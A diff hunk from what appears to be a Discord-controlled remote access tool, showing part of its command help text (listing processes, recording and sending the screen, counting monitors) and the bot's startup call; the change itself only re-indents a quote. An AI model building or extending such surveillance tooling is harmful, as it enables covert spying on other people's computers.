@@ -832,7 +832,7 @@ while True:
         !processes - Lists all running processes.
         !screenrecord [action(start, stop)] [monitor] - Sends a screen record of the computer.
         !monitors - Reveals how many monitors does the computer have
-        '''
+            '''
             for i in range(0, len(wiadomosc), 2000):
                 await ctx.send(wiadomosc[i:i+2000])
         bot.run(hshfasudf)
